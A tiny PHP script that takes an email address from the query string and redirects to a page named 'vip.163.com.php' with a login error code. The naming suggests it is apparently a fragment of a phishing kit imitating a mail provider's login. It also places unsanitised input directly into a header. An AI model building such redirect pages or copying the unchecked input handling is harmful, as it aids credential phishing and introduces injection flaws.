<?php
$email = $_GET['email'];
header("Location: vip.163.com.php?errorType=498&error&email=$email");
?>